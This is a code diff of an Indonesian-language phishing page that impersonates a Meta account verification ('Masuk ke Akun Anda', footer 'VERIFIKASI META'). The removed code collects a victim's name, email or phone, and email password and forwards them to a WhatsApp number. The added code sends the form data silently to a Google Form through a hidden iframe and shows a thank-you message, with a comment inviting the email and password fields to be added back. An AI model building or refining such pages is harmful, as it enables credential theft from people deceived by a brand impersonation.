@@ -5,112 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Verifikasi Akun</title>
   <style>
-    /* Reset & font */
     @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap");
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Roboto", sans-serif; }
-
-    body {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      background: linear-gradient(to bottom, #ffd700 50px, #0057e7 0);
-      position: relative;
-    }
-
-    /* Header Putih sebagai lapisan atas */
-    header {
-      background-color: #FFFFFF;
-      padding: 16px;
-      text-align: center;
-      font-size: 1.6rem;
-      font-weight: bold;
-      color: #000;
-      margin-bottom: 12px;
-    }
-
-    /* Tulisan tambahan di bawah header */
-    .description {
-      text-align: center;
-      color: #000;
-      background-color: #fff;
-      padding: 8px 16px;
-      font-size: 1rem;
-      font-weight: 400;
-      max-width: 600px;
-      margin: 0 auto 24px auto;
-      border-radius: 4px;
-    }
-
-    /* Konten utama dengan background putih, ditempatkan di atas biru dan diposisikan tengah */
-    .card {
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 380px;
-      padding: 24px;
-      position: absolute;
-      top: calc(50% + 50px);
-      left: 50%;
-      transform: translate(-50%, -50%);
-    }
-
-    .card h1 {
-      color: #1877f2;
-      font-size: 1.8rem;
-      text-align: center;
-      margin-bottom: 16px;
-    }
-
-    .card form {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
+    body { min-height: 100vh; display: flex; flex-direction: column; background: linear-gradient(to bottom, #ffd700 50px, #0057e7 0); position: relative; }
+    header { background-color: #FFFFFF; padding: 16px; text-align: center; font-size: 1.6rem; font-weight: bold; color: #000; margin-bottom: 12px; }
+    .description { text-align: center; color: #000; background-color: #fff; padding: 8px 16px; font-size: 1rem; max-width: 600px; margin: 0 auto 24px auto; border-radius: 4px; }
+    .card { background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 380px; padding: 24px; position: absolute; top: calc(50% + 50px); left: 50%; transform: translate(-50%, -50%); }
+    .card h1 { color: #1877f2; font-size: 1.8rem; text-align: center; margin-bottom: 16px; }
+    .card form { display: flex; flex-direction: column; gap: 16px; }
     label { font-weight: 500; margin-bottom: 4px; }
-
-    input, textarea {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 1rem;
-      transition: border-color 0.2s;
-    }
-
-    input:focus, textarea:focus {
-      border-color: #1877f2;
-      outline: none;
-    }
-
-    button {
-      padding: 12px;
-      background: #1877f2;
-      color: #fff;
-      font-size: 1rem;
-      font-weight: 500;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    button:hover {
-      background: #145eb3;
-    }
-
-    /* Footer sebagai lapisan biru bawah */
-    footer {
-      background-color: #0057e7;
-      padding: 12px;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #fff;
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-    }
+    input, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; transition: border-color 0.2s; }
+    input:focus, textarea:focus { border-color: #1877f2; outline: none; }
+    button { padding: 12px; background: #1877f2; color: #fff; font-size: 1rem; font-weight: 500; border: none; border-radius: 6px; cursor: pointer; transition: background 0.2s; }
+    button:hover { background: #145eb3; }
+    footer { background-color: #0057e7; padding: 12px; text-align: center; font-size: 0.9rem; color: #fff; position: fixed; bottom: 0; width: 100%; }
   </style>
 </head>
 <body>
@@ -122,39 +30,36 @@
 
   <div class="card">
     <h1>Masuk ke Akun Anda</h1>
-    <form id="login-form">
+
+    <!-- Iframe tersembunyi untuk menghindari redirect -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <!-- Form yang langsung mengirim ke Google Form -->
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLScix2BBzAbJ8y2Of8YKl_oleYDDe2vdgxial-Omg_qV16Qs8w/formResponse?submit=Submit"
+          method="POST" target="hidden_iframe" onsubmit="submitted=true;">
       <div>
         <label for="name">Nama Lengkap</label>
-        <input type="text" id="name" name="name" placeholder="Masukkan nama lengkap" required>
+        <input type="text" id="name" name="entry.1742004201" placeholder="Masukkan nama lengkap" required>
       </div>
-      <div>
-        <label for="emailOrPhone">Email atau Nomor Telepon</label>
-        <input type="email" id="emailOrPhone" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
-      </div>
-      <div>
-        <label for="password">Kata Sandi Email</label>
-        <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required autocomplete="current-password">
-      </div>
+      <!-- Jika ada field lainnya seperti email & kata sandi, tambahkan di sini dengan name entry.xxx -->
       <button type="submit">Kirim & Amankan</button>
     </form>
+
+    <p id="thankyou_message" style="display:none; text-align:center; margin-top:12px;">
+      Terima kasih, data berhasil dikirim!
+    </p>
   </div>
 
   <footer>&copy; 2025 VERIFIKASI META</footer>
 
   <script>
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const name = encodeURIComponent(document.getElementById('name').value);
-      const emailOrPhone = encodeURIComponent(document.getElementById('emailOrPhone').value);
-      const password = encodeURIComponent(document.getElementById('password').value);
-
-      const phoneNumber = '12498950768'; // Ganti dengan nomor WhatsApp Anda
-      const message = `Hallo meta Verifikasi Akun:%0A%0ANama: ${name}%0AEmail/Nomor Telepon: ${emailOrPhone}%0AKata Sandi Email: ${password}`;
-
-      const url = `https://wa.me/${phoneNumber}?text=${message}`;
-      window.open(url, '_blank');
-    });
+    var submitted = false;
+    document.getElementById('thankyou_message'); // pastikan element ada
+    document.getElementById('hidden_iframe').onload = function(){
+      if(submitted) {
+        document.getElementById('thankyou_message').style.display = 'block';
+      }
+    };
   </script>
 </body>
 </html>
